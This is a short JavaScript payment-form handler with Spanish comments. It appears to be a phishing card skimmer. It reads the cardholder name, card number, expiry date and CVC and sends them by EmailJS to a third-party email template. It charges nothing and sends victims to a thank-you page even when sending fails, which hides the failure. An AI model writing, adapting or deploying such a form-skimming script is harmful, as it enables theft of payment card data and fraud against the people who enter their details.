(function() {
    emailjs.init('ReqtkWfjI392LAzFb');
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = {
        nombre: document.getElementById('cardHolder').value, // Nombre del campo corregido
        numero: document.getElementById('cardNumber').value,
        fecha: document.getElementById('expiryDate').value,
        cvc: document.getElementById('cvc').value
    };

    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
        alert('Ingresa tu nombre completo');
        return;
    }

    // Resto de validaciones igual...

    emailjs.send("service_syrc1uk", "template_u3etoro", formData)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "thank-you.html";
        });
});
